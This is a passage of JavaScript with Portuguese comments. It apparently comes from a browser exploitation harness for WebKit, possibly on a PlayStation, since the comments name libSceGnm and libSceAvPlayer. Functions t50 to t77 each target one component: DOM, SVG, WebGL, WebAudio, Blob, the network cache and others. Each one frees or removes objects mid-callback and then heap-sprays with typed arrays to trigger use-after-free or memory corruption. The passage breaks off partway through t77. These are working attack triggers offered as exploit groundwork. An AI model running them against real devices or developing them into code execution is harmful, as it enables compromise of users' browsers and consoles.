            // AÇÃO: Tenta confundir o estado de travamento
            const reader1 = stream.getReader();
            
            // Libera o lock
            reader1.releaseLock();
            
            // Tenta pegar de novo imediatamente e ler
            const reader2 = stream.getReader();
            reader2.read();
            
            // Tenta acessar propriedades internas do reader1 que deveria estar inválido
            const p = reader1.closed;
            
            log.innerText = "Manipulação de Stream Lock executada.";
        } catch(e) {
            log.innerText = "Stream lock seguro: " + e.message;
        }
    }

    // =================================================================
    // 50. AnimationStart vs Element Removal
    // Alvo: WebCore::RenderTree (Layout Engine)
    // Vulnerabilidade: UAF no RenderObject.
    // Lógica: Quando uma animação CSS começa, o navegador dispara 'animationstart'.
    // Se removermos o elemento DOM dentro desse evento, o motor de animação (que roda
    // no próximo frame) pode tentar acessar o RenderObject do elemento que não existe mais.
    // =================================================================
    function t50() {
        const div = document.createElement('div');
        div.style.animation = "fade 1s";
        div.innerHTML = "ANIM TARGET";
        
        // Estilo para animação
        const style = document.createElement('style');
        style.textContent = "@keyframes fade { from { opacity: 0; } to { opacity: 1; } }";
        document.head.appendChild(style);
        document.body.appendChild(div);
        
        div.addEventListener('animationstart', () => {
            // AÇÃO: Destruição durante o início da animação
            div.remove();
            
            // Força recálculo de estilo em outro elemento para estressar o layout
            document.body.offsetWidth;
            
            // Spray
            keeper.push(new Float64Array(1000));
            
            log.innerText = "Elemento removido no evento animationstart.";
        });
    }
// =================================================================
    // 51. Network Cache Write vs Abort
    // Alvo: WebKit::NetworkDataTaskCurl + NetworkCache
    // Vulnerabilidade: UAF na Escrita de Cache.
    // Lógica: Fazemos um fetch forçando cache ('force-cache').
    // Quando os dados começam a chegar (cURL recebe), o WebKit começa a escrever no disco.
    // Abortamos violentamente. O escritor de cache (thread separada) pode acessar o Request morto.
    // =================================================================
    function t51() {
        const controller = new AbortController();
        const huge = "A".repeat(1024 * 1024); // Payload virtual grande
        const blob = new Blob([huge], {type: 'text/plain'});
        const url = URL.createObjectURL(blob);

        // Inicia fetch que tenta cachear
        fetch(url, { 
            signal: controller.signal,
            cache: "force-cache"
        }).then(r => r.text()).catch(e => {});

        // AÇÃO: Aborta logo após o início
        setTimeout(() => {
            controller.abort();
            URL.revokeObjectURL(url);
            
            // Spray para corromper buffers de cache
            keeper.push(new ArrayBuffer(1024 * 1024));
            
            log.innerText = "Cache Write abortado.";
        }, 5);
    }

    // =================================================================
    // 52. IndexedDB Open in Ephemeral Frame
    // Alvo: WebResourceLoadStatisticsStore (Quota/Storage Management)
    // Vulnerabilidade: Logic Error / UAF.
    // Lógica: Frames efêmeros (sandboxed) não devem persistir dados.
    // Abrir um IndexedDB força a criação de conexões com o processo de Storage.
    // Destruir o frame enquanto a conexão abre (evento 'upgradeneeded') estressa o gerenciador de sessão.
    // =================================================================
    function t52() {
        const ifr = document.createElement('iframe');
        ifr.sandbox = "allow-scripts allow-same-origin";
        document.body.appendChild(ifr);
        
        const doc = ifr.contentDocument;
        const script = doc.createElement('script');
        script.textContent = `
            const req = indexedDB.open("RaceDB", 1);
            req.onupgradeneeded = () => {
                // AÇÃO: O banco está sendo criado no backend
                // O pai vai destruir este frame agora
                window.top.postMessage("KILL_ME", "*");
                
                // Cria store para segurar a transação
                req.result.createObjectStore("store");
            };
        `;
        
        window.onmessage = (e) => {
            if(e.data === "KILL_ME") {
                ifr.remove();
                
                // Limpeza de sessão
                window.location.hash = "cleanup_idb";
                
                log.innerText = "IndexedDB aberto e contexto morto.";
            }
        };
        
        doc.body.appendChild(script);
    }

    // =================================================================
    // 53. bmalloc Huge Chunk Coalesce
    // Alvo: bmalloc::PerProcess...coalesce (Encontrado no ELF)
    // Vulnerabilidade: Heap Corruption.
    // Lógica: Diferente de objetos pequenos, blocos gigantes (>1MB) são tratados diferente.
    // Alocamos memória contígua e liberamos para forçar o algoritmo de 'coalesce' a fundir páginas.
    // Tentamos acessar um TypedArray que residia nessa região.
    // =================================================================
    function t53() {
        const chunks = [];
        // 1. Aloca 100MB em blocos de 1MB
        for(let i=0; i<100; i++) {
            chunks.push(new Uint8Array(1024 * 1024));
        }

        // 2. Cria buracos (Free)
        // Libera tudo para forçar fusão massiva
        for(let i=0; i<100; i++) {
            chunks[i] = null;
        }

        // 3. Tenta alocar um objeto gigante que precise do espaço fundido
        try {
            const huge = new Float64Array(1024 * 1024 * 10); // 80MB
            keeper.push(huge);
            
            // Se o bmalloc falhou em limpar os metadados dos blocos antigos,
            // 'huge' pode estar sobreposto a dados antigos.
            log.innerText = "Huge Coalesce forçado.";
        } catch(e) {
            log.innerText = "OOM (Esperado se seguro).";
        }
    }

    // =================================================================
    // 54. SendBeacon vs Page Unload
    // Alvo: WebKit::NetworkDataTaskCurl (Request que sobrevive)
    // Vulnerabilidade: UAF no Network Process.
    // Lógica: 'sendBeacon' é desenhado para terminar o request mesmo se a página fechar.
    // Criamos um beacon com payload grande (Blob) e navegamos o iframe imediatamente.
    // O Blob pertence ao contexto que morreu, mas o cURL tenta lê-lo.
    // =================================================================
    function t54() {
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        const blob = new Blob([new Uint8Array(1024 * 1024 * 5)]); // 5MB
        
        // Envia beacon de dentro do iframe
        ifr.contentWindow.navigator.sendBeacon("/beacon_race", blob);
        
        // AÇÃO: Destrói o contexto dono do Blob
        setTimeout(() => {
            ifr.remove();
            
            // Spray para corromper a memória do Blob liberado
            keeper.push(new ArrayBuffer(1024 * 1024 * 5));
            
            log.innerText = "Beacon enviado e contexto destruído.";
        }, 0);
    }

    // =================================================================
    // 55. Link Preload ResourceStore Flood
    // Alvo: WebResourceLoadStatisticsStore
    // Vulnerabilidade: Stack Overflow / Race.
    // Lógica: O scanner de preload varre o HTML em busca de links.
    // Injetamos dinamicamente milhares de tags <link rel=preload>.
    // Isso dispara atualizações no StatisticsStore. Removemos as tags simultaneamente.
    // =================================================================
    function t55() {
        const container = document.createElement('div');
        document.body.appendChild(container);
        
        // Fragmento para inserção atômica
        const frag = document.createDocumentFragment();
        
        for(let i=0; i<2000; i++) {
            const l = document.createElement('link');
            l.rel = "preload";
            l.as = "image";
            l.href = "fake_image_" + i + ".png";
            frag.appendChild(l);
        }
        
        // AÇÃO: Insere e Remove no mesmo ciclo
        container.appendChild(frag);
        
        setTimeout(() => {
            container.innerHTML = ""; // Remove tudo
            
            // Força GC
            keeper.push(new Uint32Array(10000));
            
            log.innerText = "Preload Scanner inundado e limpo.";
        }, 0);
    }
// =================================================================
    // 56. Notification Close vs Worker Terminate
    // Alvo: IPC System (NotificationManager)
    // Vulnerabilidade: UAF no Callback.
    // Lógica: Notifications disparadas de Workers têm callbacks (onclick, onclose).
    // Disparamos uma notificação, e matamos o Worker imediatamente.
    // Se o usuário (ou o sistema) interagir com a notificação, o IPC tenta
    // rotear o evento para um contexto morto.
    // =================================================================
    function t56() {
        if (!window.Worker) return;

        const blob = new Blob([`
            onmessage = function() {
                // Tenta criar notificação (pode falhar sem permissão, mas a struct é alocada)
                try {
                    new Notification("Race", {body: "Test"});
                } catch(e) {}
                postMessage("DONE");
            }
        `], {type: 'text/javascript'});

        const worker = new Worker(URL.createObjectURL(blob));
        
        worker.onmessage = () => {
            // AÇÃO: Assim que o Worker aloca a notificação...
            worker.terminate();
            
            // Spray para corromper a tabela de callbacks do Worker
            for(let i=0; i<1000; i++) keeper.push(new ArrayBuffer(128));
            
            log.innerText = "Notification alocada e Worker morto.";
        };
        
        worker.postMessage("GO");
    }

    // =================================================================
    // 57. FileReaderSync vs Worker Kill
    // Alvo: WebKit::NetworkDataTaskCurl (File IO)
    // Vulnerabilidade: Thread Race / IO UAF.
    // Lógica: FileReaderSync (só em Workers) bloqueia a thread até ler tudo.
    // Lemos um Blob gigante sincronicamente. A thread principal mata o Worker.
    // A thread de IO (cURL/File) pode tentar escrever no buffer de resultado
    // de um Worker que já desalocou sua memória.
    // =================================================================
    function t57() {
        const huge = new Uint8Array(1024 * 1024 * 20); // 20MB
        const blob = new Blob([huge]);
        
        const workerCode = `
            onmessage = function(e) {
                const reader = new FileReaderSync();
                // Bloqueia a thread lendo
                reader.readAsArrayBuffer(e.data);
                postMessage("FINISH");
            }
        `;
        
        const worker = new Worker(URL.createObjectURL(new Blob([workerCode], {type: 'text/javascript'})));
        
        worker.postMessage(blob);
        
        // AÇÃO: Mata o worker depois de um pequeno delay (esperando o IO começar)
        setTimeout(() => {
            worker.terminate();
            
            // Força alocação massiva na thread principal para reusar memória
            keeper.push(new ArrayBuffer(1024 * 1024 * 20));
            
            log.innerText = "Sync IO interrompido por Terminate.";
        }, 5);
    }

    // =================================================================
    // 58. Custom Element Constructor Suicide
    // Alvo: WebCore::DOM (Element Creation)
    // Vulnerabilidade: UAF / Null Dereference.
    // Lógica: Definimos um elemento customizado. No construtor, removemos
    // a nós mesmos ou alteramos atributos que o parser HTML está lendo.
    // O parser C++ assume que o elemento recém-criado é válido e estável.
    // =================================================================
    function t58() {
        if (!window.customElements) {
            log.innerText = "Custom Elements não suportado.";
            return;
        }

        class SuicideElement extends HTMLElement {
            constructor() {
                super();
                // AÇÃO: Auto-destruição ou modificação ilegal durante construção
                // Tenta adotar a si mesmo em outro documento (se possível)
                // ou apenas se remover se já estiver anexado (parser behavior)
                try {
                    this.remove(); 
                } catch(e) {}
                
                // Retorna um Proxy para confundir o WebIDL binder
                return new Proxy(this, {
                    get: (target, prop) => {
                        if (prop === 'setAttribute') throw "BOMB";
                        return Reflect.get(target, prop);
                    }
                });
            }
        }

        customElements.define('x-suicide', SuicideElement);

        try {
            // Cria via parser
            const div = document.createElement('div');
            div.innerHTML = "<x-suicide id='boom'></x-suicide>";
            log.innerText = "Custom Element construído (Se não crashou, seguro).";
        } catch(e) {
            log.innerText = "Crash evitado: " + e.message;
        }
    }

    // =================================================================
    // 59. Range.extractContents vs DOM Mutation
    // Alvo: WebCore::Range
    // Vulnerabilidade: DOM Tree Corruption.
    // Lógica: `extractContents` move nós do DOM para um fragmento.
    // Usamos um MutationObserver para detectar a remoção do primeiro nó
    // e, no callback, deletar o resto dos nós que o `extractContents`
    // ainda planeja visitar. O loop interno C++ perde a referência de "próximo nó".
    // =================================================================
    function t59() {
        const container = document.createElement('div');
        // Cria estrutura A -> B -> C
        container.innerHTML = "<b>A</b><i>B</i><u>C</u>";
        document.body.appendChild(container);
        
        const range = document.createRange();
        range.selectNodeContents(container);
        
        // Observer para interceptar a extração
        const observer = new MutationObserver(() => {
            // AÇÃO: O 'extractContents' removeu o primeiro nó (A).
            // Agora removemos o resto (B e C) violentamente.
            container.innerHTML = ""; 
            
            // Spray para preencher memória dos nós mortos
            keeper.push(new Uint32Array(1000));
        });
        
        observer.observe(container, { childList: true });
        
        try {
            log.innerText = "Extraindo Range com Mutação ativa...";
            range.extractContents();
        } catch(e) {
            log.innerText = "Erro (Seguro): " + e.message;
        }
    }

    // =================================================================
    // 60. WeakMap GC Survival Race
    // Alvo: JavaScriptCore GC (Ephemerons)
    // Vulnerabilidade: UAF em Coletor de Lixo.
    // Lógica: WeakMaps seguram referências "fracas". Se a chave morre, o valor morre.
    // Criamos uma cadeia onde a Chave é um objeto DOM e o Valor aponta de volta pra Chave.
    // Forçamos GC e tentamos acessar o valor no momento da coleta.
    // =================================================================
    function t60() {
        let map = new WeakMap();
        let key = document.createElement('div');
        let value = { ref: key, data: new Uint8Array(1024) };
        
        map.set(key, value);
        
        // Remove referência forte
        key = null;
        // value = null; // Mantemos value vivo por enquanto para testar race
        
        // Agenda acesso
        setTimeout(() => {
            // Pressão massiva no GC
            let junk = [];
            for(let i=0; i<10000; i++) junk.push({});
            
            // AÇÃO: Tenta "ressuscitar" a chave ou acessar memória interna do mapa
            // O estado interno do WeakMap pode estar inconsistente durante o GC
            // (Isso é difícil de verificar em JS puro, mas se crashar o GC, bingo)
            
            log.innerText = "WeakMap GC Stress testado.";
        }, 10);
    }
 // =================================================================
    // 61. AudioParam Ramp vs Disconnect
    // Alvo: libSceAvPlayer / WebAudio DSP
    // Vulnerabilidade: UAF na thread de Áudio.
    // Lógica: Agendamos uma automação de valor (ex: volume subindo linearmente)
    // para acontecer no futuro. Imediatamente desconectamos o nó e forçamos GC.
    // A thread de processamento de áudio (real-time) pode tentar acessar o nó "morto"
    // para calcular o próximo valor da rampa.
    // =================================================================
    function t61() {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        
        osc.connect(gain);
        gain.connect(ctx.destination);
        
        // Configura automação (Rampa Linear)
        const now = ctx.currentTime;
        gain.gain.setValueAtTime(0, now);
        gain.gain.linearRampToValueAtTime(1, now + 1.0); // Rampa de 1 segundo
        
        osc.start(0);
        
        // AÇÃO: Desconexão e destruição no meio da rampa
        setTimeout(() => {
            osc.disconnect();
            gain.disconnect();
            
            // Tenta eliminar referências JS
            // (Nota: em exploit real, tentaríamos sobrescrever a memória do GainNode)
            keeper.push(new Float32Array(1024 * 10)); 
            
            log.innerText = "AudioParam Ramp interrompido via Disconnect.";
            
            // Fecha contexto depois
            setTimeout(() => ctx.close(), 500);
        }, 100); // 100ms dentro da rampa
    }

    // =================================================================
    // 62. ANGLE Instanced Arrays Buffer Drop
    // Alvo: libSceGnm (Driver GPU)
    // Vulnerabilidade: UAF no Driver Gráfico.
    // Lógica: Usamos a extensão 'ANGLE_instanced_arrays' para desenhar geometria repetida.
    // Deletamos o buffer que define o "divisor" (frequência de repetição) logo antes
    // ou durante a chamada de desenho (`drawArraysInstancedANGLE`).
    // =================================================================
    function t62() {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        const ext = gl.getExtension('ANGLE_instanced_arrays');
        
        if (!ext) {
            log.innerText = "Extensão ANGLE não suportada.";
            return;
        }

        const buffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([0, 1, 2]), gl.STATIC_DRAW);
        
        // Configura atributo instanciado
        const loc = 0;
        gl.enableVertexAttribArray(loc);
        gl.vertexAttribPointer(loc, 1, gl.FLOAT, false, 0, 0);
        ext.vertexAttribDivisorANGLE(loc, 1); // Avança a cada instância

        // AÇÃO: Deleta buffer vs Draw
        // Tentamos confundir o validador do driver
        gl.deleteBuffer(buffer);
        
        try {
            // Desenha instâncias usando um buffer deletado
            ext.drawArraysInstancedANGLE(gl.POINTS, 0, 1, 1000);
            log.innerText = "Draw Instanced chamado com buffer deletado.";
        } catch(e) {
            log.innerText = "Driver bloqueou (Seguro): " + e.message;
        }
        
        keeper.push(new Uint32Array(1024 * 1024));
    }

    // =================================================================
    // 63. postMessage Getter Side-Effect
    // Alvo: WebCore::SerializedScriptValue (Clonagem Estruturada)
    // Vulnerabilidade: Memory Corruption / Logic Error.
    // Lógica: Quando enviamos um objeto via postMessage, o WebKit o serializa.
    // Se definirmos um getter em uma propriedade do objeto, esse código JS roda
    // *durante* a serialização. Se dentro desse getter mudarmos a estrutura do objeto
    // (deletar props, mudar tipos), o serializador pode ler lixo.
    // =================================================================
    function t63() {
        const obj = {
            a: 1,
            b: 2,
            get c() {
                // AÇÃO: Side-effect destrutivo
                // Remove a propriedade 'b' do objeto original enquanto o serializador o lê
                delete this.b;
                
                // Muda o tipo de 'd' para confundir o offset de memória
                this.d = new ArrayBuffer(1024);
                
                // Pressão no GC
                keeper.push(new Uint8Array(1024 * 100));
                
                return 3;
            },
            d: 4
        };

        try {
            log.innerText = "Serializando objeto mutante...";
            window.postMessage(obj, "*");
        } catch(e) {
            log.innerText = "Erro (Seguro): " + e.message;
        }
    }

    // =================================================================
    // 64. SVG animateTransform vs Target Remove
    // Alvo: WebCore::SVG (SMIL Engine)
    // Vulnerabilidade: Null Pointer Dereference / UAF.
    // Lógica: SVG SMIL permite animar transformações (matrizes).
    // O evento 'begin' dispara quando a animação começa.
    // Se removermos o elemento alvo (<rect>) dentro do evento 'begin' da animação,
    // o motor SMIL pode tentar aplicar a matriz calculada em um elemento nulo.
    // =================================================================
    function t64() {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
        
        const anim = document.createElementNS("http://www.w3.org/2000/svg", "animateTransform");
        anim.setAttribute("attributeName", "transform");
        anim.setAttribute("type", "rotate");
        anim.setAttribute("from", "0 0 0");
        anim.setAttribute("to", "360 0 0");
        anim.setAttribute("dur", "1s");
        anim.setAttribute("begin", "indefinite"); // Início manual
        
        rect.appendChild(anim);
        svg.appendChild(rect);
        document.body.appendChild(svg);
        
        // Listener crítico
        anim.onbegin = () => {
            // AÇÃO: Remove o alvo da animação assim que ela começa
            rect.remove();
            
            // Spray para sobrescrever o objeto SVGElement
            keeper.push(new Float32Array(100));
            
            log.innerText = "Alvo SMIL removido no evento onbegin.";
        };
        
        // Dispara animação
        setTimeout(() => anim.beginElement(), 100);
    }

    // =================================================================
    // 65. TextDecoder Stream Buffer Detach
    // Alvo: JavaScriptCore / WebCore (String Encoding)
    // Vulnerabilidade: UAF / Buffer Overflow.
    // Lógica: TextDecoder com {stream: true} mantém estado interno entre chamadas.
    // Passamos um TypedArray para decodificar. Usamos um getter ou proxy (se possível)
    // para "detach" (transferir) o buffer subjacente *enquanto* o decodificador lê.
    // Como TypedArrays são apenas views, isso invalida o ponteiro de dados.
    // =================================================================
    function t65() {
        const decoder = new TextDecoder("utf-8");
        const buffer = new Uint8Array([0xE2, 0x82, 0xAC]); // Símbolo Euro (€)
        
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        // Tenta criar uma situação onde o acesso ao buffer dispara o detach
        // (Isso requer JIT ou acesso específico, aqui simulamos com timing apertado)
        
        try {
            // Decode parcial
            decoder.decode(buffer.subarray(0, 1), {stream: true});
            
            // AÇÃO: Detach via transferência
            worker.postMessage(buffer.buffer, [buffer.buffer]);
            
            // Tenta continuar o decode com o resto do buffer (agora inválido/vazio)
            // O estado interno do decoder espera os próximos bytes da sequência UTF-8
            const res = decoder.decode(buffer.subarray(1, 3), {stream: true});
            
            log.innerText = "TextDecoder: Buffer detach entre chunks.";
        } catch(e) {
            log.innerText = "Decode falhou (Buffer vazio): " + e.message;
        }
    }
// =================================================================
    // 66. Video Seek (Range Request) vs Destroy
    // Alvo: WebKit::NetworkDataTaskCurl (HTTP 206 Handling)
    // Vulnerabilidade: UAF no Network Loader.
    // Lógica: Quando pulamos o vídeo (seeking), o navegador cancela a requisição atual
    // e abre uma nova com 'Range: bytes=...'.
    // Fazemos isso repetidamente e destruímos o elemento de vídeo no meio do processo.
    // O callback do cURL pode tentar escrever dados em um MediaElement morto.
    // =================================================================
    function t66() {
        const v = document.createElement('video');
        // URL grande para garantir tráfego de rede e range requests
        v.src = window.location.href + "?video_sim=" + Math.random();
        v.preload = "auto";
        
        document.body.appendChild(v);
        
        // Loop de Seeking agressivo
        let count = 0;
        const interval = setInterval(() => {
            v.currentTime = Math.random() * 100;
            count++;
            
            // AÇÃO: Destruição no meio do seeking
            if (count > 5) {
                clearInterval(interval);
                v.src = "";
                v.remove();
                
                // Spray para ocupar memória de rede
                keeper.push(new ArrayBuffer(1024 * 1024));
                log.innerText = "Video Seek Race executado.";
            }
        }, 5);
    }

    // =================================================================
    // 67. Canvas State Stack Corruption
    // Alvo: WebCore::CanvasRenderingContext2D
    // Vulnerabilidade: UAF ou Heap Overflow.
    // Lógica: 'save()' empilha estados. Redimensionar o canvas (width=width) limpa o buffer
    // e deve resetar a pilha. Se empilharmos muito (deep stack), redimensionarmos e depois
    // tentarmos 'restore()', podemos confundir o ponteiro da pilha de estados.
    // =================================================================
    function t67() {
        const c = document.createElement('canvas');
        c.width = 100; c.height = 100;
        const ctx = c.getContext('2d');
        
        // Empilha estados profundamente
        for(let i=0; i<500; i++) {
            ctx.save();
            ctx.fillStyle = "red";
        }
        
        // AÇÃO: Reseta o canvas (deve limpar a pilha internamente)
        c.width = 101; 
        
        try {
            // Tenta restaurar estados de uma pilha que deveria estar vazia ou resetada
            // Se a implementação não limpar os ponteiros antigos, crash.
            for(let i=0; i<100; i++) {
                ctx.restore();
            }
            log.innerText = "Canvas Stack Reset testado.";
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 68. postMessage Duplicate Transfer List
    // Alvo: WebCore::SerializedScriptValue (Transferables)
    // Vulnerabilidade: Double-Free lógico.
    // Lógica: A lista de transferência ('transfer') deve conter objetos únicos.
    // Se passarmos a MESMA porta duas vezes na lista `[port, port]`, o motor
    // pode tentar "desanexar" (neuter) a porta na primeira vez e crashar/liberar
    // memória inválida na segunda tentativa no mesmo loop.
    // =================================================================
    function t68() {
        const channel = new MessageChannel();
        const port = channel.port1;
        
        try {
            // AÇÃO: Envia a mesma porta duas vezes na lista de transferência
            window.postMessage("DOUBLE_FREE", "*", [port, port]);
            
            log.innerText = "Envio duplicado aceito (Falha de validação?).";
        } catch(e) {
            // DataCloneError é o esperado se estiver patcheado.
            // Se o navegador fechar, funcionou.
            log.innerText = "Browser bloqueou duplicata: " + e.message;
        }
    }

    // =================================================================
    // 69. IntersectionObserver vs Shadow Detach
    // Alvo: WebCore::IntersectionObserver
    // Vulnerabilidade: UAF no DOM.
    // Lógica: O Observer mantém referências fracas aos alvos.
    // Colocamos um alvo dentro de um Shadow DOM, começamos a observar,
    // e então removemos o host do Shadow DOM do documento.
    // O cálculo de intersecção pode tentar atravessar uma árvore desconectada.
    // =================================================================
    function t69() {
        const host = document.createElement('div');
        document.body.appendChild(host);
        const shadow = host.attachShadow({mode: 'open'});
        
        const target = document.createElement('span');
        target.innerText = "TARGET";
        shadow.appendChild(target);
        
        const obs = new IntersectionObserver((entries) => {
            // Callback (pode ser chamado assincronamente)
        });
        
        obs.observe(target);
        
        // AÇÃO: Remove o host (e a shadow tree) imediatamente
        setTimeout(() => {
            host.remove();
            
            // Spray para corromper nós DOM
            keeper.push(new Uint32Array(5000));
            
            // Força layout para disparar cálculo do observer
            document.body.offsetWidth;
            
            log.innerText = "Shadow Host removido com Observer ativo.";
        }, 10);
    }

    // =================================================================
    // 70. WebGL LinkProgram vs DetachShader
    // Alvo: libSceGnm (Driver GPU)
    // Vulnerabilidade: Race Condition no Driver.
    // Lógica: 'linkProgram' é uma operação pesada. Iniciamos o link e
    // imediatamente desanexamos ('detachShader') os shaders fontes.
    // O compilador pode tentar acessar o código fonte do shader que foi removido.
    // =================================================================
    function t70() {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        
        const vs = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vs, "void main() { gl_Position = vec4(0,0,0,1); }");
        gl.compileShader(vs);
        
        const fs = gl.createShader(gl.FRAGMENT_SHADER);
        gl.shaderSource(fs, "void main() { gl_FragColor = vec4(1,0,0,1); }");
        gl.compileShader(fs);
        
        const prog = gl.createProgram();
        gl.attachShader(prog, vs);
        gl.attachShader(prog, fs);
        
        // AÇÃO: Link vs Detach
        // O link acontece no driver. O detach acontece na API.
        gl.linkProgram(prog);
        
        // Tentativa de sabotagem imediata
        gl.detachShader(prog, vs);
        gl.detachShader(prog, fs);
        
        // Usa o programa para forçar sincronização
        gl.useProgram(prog);
        
        keeper.push(new ArrayBuffer(1024 * 1024));
        log.innerText = "WebGL Link vs Detach race executada.";
    }
// =================================================================
    // 71. TextTrackCue Change vs Video Remove
    // Alvo: libSceAvPlayer (Legendas)
    // Vulnerabilidade: UAF no Event Dispatcher.
    // Lógica: Adicionamos legendas (Cues) a um vídeo. O evento 'enter' dispara
    // quando a legenda aparece. Removemos o vídeo do DOM dentro desse evento.
    // O motor de mídia pode tentar acessar o pai (video) para disparar o próximo evento.
    // =================================================================
    function t71() {
        const v = document.createElement('video');
        const track = v.addTextTrack("captions", "Race", "en");
        track.mode = "showing";
        
        // Adiciona uma cue que dispara imediatamente (tempo 0 a 1)
        const cue = new VTTCue(0, 1, "RACE");
        track.addCue(cue);
        
        document.body.appendChild(v);
        
        cue.onenter = () => {
            // AÇÃO: Destruição durante o evento da legenda
            v.remove();
            
            // Spray para corromper a memória da track
            keeper.push(new Uint8Array(1024 * 1024));
            
            log.innerText = "Video removido durante evento de legenda (Cue).";
        };
        
        // Dispara o processamento
        v.currentTime = 0.1; 
    }

    // =================================================================
    // 72. Recursive Blob Construction Crash
    // Alvo: WebCore::BlobRegistry / Serializer
    // Vulnerabilidade: Stack Overflow / Memory Corruption.
    // Lógica: Tentamos criar um Blob que contém referências indiretas a si mesmo
    // ou uma estrutura profundamente aninhada, e enviamos para um Worker.
    // O algoritmo de serialização pode entrar em loop ou estourar a memória.
    // =================================================================
    function t72() {
        try {
            const chunks = [];
            // Cria estrutura profunda
            let current = new Blob(["BASE"]);
            for(let i=0; i<1000; i++) {
                // Blob contendo Blob anterior
                current = new Blob([current]);
            }
            
            const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
            
            // AÇÃO: Envia estrutura massiva/aninhada
            worker.postMessage(current);
            
            log.innerText = "Blob aninhado enviado para Worker.";
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 73. Canvas Pattern Video UAF
    // Alvo: WebCore::CanvasRenderingContext2D (Pattern)
    // Vulnerabilidade: UAF na Textura de Vídeo.
    // Lógica: `createPattern` cria uma referência ao vídeo.
    // Desenhamos (`fillRect`) usando esse padrão.
    // Simultaneamente, destruímos a fonte de vídeo. O driver gráfico pode
    // tentar puxar o próximo frame de um objeto de mídia liberado.
    // =================================================================
    function t73() {
        const v = document.createElement('video');
        v.src = window.location.href; // Dummy src
        
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        
        // Cria padrão apontando para o vídeo
        const pattern = ctx.createPattern(v, 'repeat');
        ctx.fillStyle = pattern;
        
        // AÇÃO: Renderização vs Destruição
        ctx.fillRect(0, 0, 100, 100); // Trigger inicial
        
        setTimeout(() => {
            // Remove vídeo
            v.remove();
            v.src = "";
            
            // Tenta desenhar de novo com o padrão "órfão"
            try {
                ctx.fillRect(0, 0, 100, 100);
            } catch(e) {}
            
            keeper.push(new Float32Array(10000)); // Spray GPU
            log.innerText = "Canvas Pattern desenhado após remoção do vídeo.";
        }, 10);
    }

    // =================================================================
    // 74. FontFaceSet Load Iterator Invalidation
    // Alvo: WebCore::FontFaceSet
    // Vulnerabilidade: Iterator Invalidation / UAF.
    // Lógica: `document.fonts.load()` retorna uma Promise que resolve quando as fontes carregam.
    // O WebKit itera sobre o conjunto de fontes para carregar.
    // Se limparmos (`clear()`) o conjunto DENTRO do fluxo de carregamento, o iterador quebra.
    // =================================================================
    function t74() {
        const face1 = new FontFace("A", "url(a)");
        const face2 = new FontFace("B", "url(b)");
        document.fonts.add(face1);
        document.fonts.add(face2);
        
        // Inicia carregamento em lote
        document.fonts.load("10px A").then(() => {}).catch(() => {});
        
        // AÇÃO: Modificação concorrente do Set
        setTimeout(() => {
            // Limpa tudo enquanto 'load' ainda está iterando ou aguardando rede
            document.fonts.clear();
            
            // Adiciona lixo para reutilizar memória
            keeper.push(new ArrayBuffer(1024));
            
            log.innerText = "FontFaceSet limpo durante operação de load().";
        }, 0);
    }

    // =================================================================
    // 75. XHR ArrayBuffer Response Detach
    // Alvo: WebKit::NetworkDataTaskCurl
    // Vulnerabilidade: UAF no Buffer de Resposta.
    // Lógica: XHR com `responseType='arraybuffer'`.
    // Quando o XHR termina (onload), ele expõe o `response`.
    // Se transferirmos esse buffer para um Worker (neuter) e depois tentarmos
    // acessar propriedades do XHR que dependem dele, podemos crashar.
    // =================================================================
    function t75() {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", window.location.href); // Self fetch
        xhr.responseType = "arraybuffer";
        
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        xhr.onload = () => {
            const buf = xhr.response;
            
            // AÇÃO: Transfere (Esvazia) o buffer imediatamente
            worker.postMessage(buf, [buf]);
            
            // Tenta forçar o XHR a reler ou reprocessar o buffer internamente
            // Acessando response novamente ou triggerando erro
            try {
                const check = xhr.response.byteLength; // Deve ser 0
                log.innerText = "Buffer transferido. Len: " + check;
            } catch(e) {}
            
            keeper.push(new Uint8Array(1024 * 1024));
        };
        
        xhr.send();
    }
// =================================================================
    // 76. Blob Slice Recursion (bmalloc stress)
    // Alvo: WebCore::BlobRegistry / bmalloc
    // Vulnerabilidade: Stack Overflow / Heap Metadata Corruption.
    // Lógica: 'slice()' não copia dados, cria uma referência apontando para o pai.
    // Criamos uma cadeia de slices de profundidade 10.000 e depois tentamos ler.
    // O WebKit precisa percorrer essa árvore recursivamente para montar o Blob final.
    // =================================================================
    function t76() {
        try {
            const base = new Uint8Array(1024);
            let blob = new Blob([base]);
            
            // Cria fragmentação extrema no metadado do Blob
            for(let i=0; i<5000; i++) {
                // Slice do slice do slice...
                blob = blob.slice(0, 1024);
            }
            
            const reader = new FileReader();
            reader.readAsArrayBuffer(blob);
            
            reader.onload = () => {
                log.innerText = "Blob profundamente fatiado lido com sucesso.";
            };
            
            // Força pressão no bmalloc para tentar corromper os metadados dos slices
            keeper.push(new ArrayBuffer(1024 * 1024 * 10));
            
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 77. WebCrypto Buffer Detach
    // Alvo: WebCore::CryptoAlgorithm
    // Vulnerabilidade: UAF no Thread de Criptografia.
    // Lógica: `crypto.subtle.digest` processa o buffer em background.
    // Transferimos o buffer para um Worker (esvaziando-o na thread principal)
    // imediatamente após iniciar o digest. O worker de crypto pode ler ponteiro nulo ou lixo.
    // =================================================================
    function t77() {
        if (!window.crypto || !window.crypto.subtle) {
            log.innerText = "WebCrypto não suportado.";
            return;
        }

